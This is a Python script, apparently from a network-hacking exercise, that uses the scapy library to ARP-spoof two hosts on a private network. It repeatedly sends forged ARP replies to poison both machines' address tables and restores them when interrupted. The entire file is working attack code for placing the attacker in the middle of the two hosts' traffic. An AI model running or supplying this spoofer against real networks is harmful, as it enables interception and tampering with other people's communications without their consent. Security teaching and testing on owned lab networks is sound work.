#!/usr/bin/env python
import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dest_ip, src_ip):
    hw_dst = get_mac(dest_ip)
    hw_src = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=hw_dst, psrc=src_ip, hwsrc=hw_src)
    scapy.send(packet, verbose=False, count=4)


packets_count = 0
try:
    while True:
        spoof("192.168.204.2", "192.168.204.141")
        spoof("192.168.204.141", "192.168.204.2")
        packets_count += 2
        print("\r[+] Packets sent: " + str(packets_count), end="")
        time.sleep(2)

except KeyboardInterrupt:
    print('\n[-] Detected Control + C ................ Resting ARP tables .............\n')
    restore("192.168.204.2", "192.168.204.141")
    restore("192.168.204.141", "192.168.204.2")
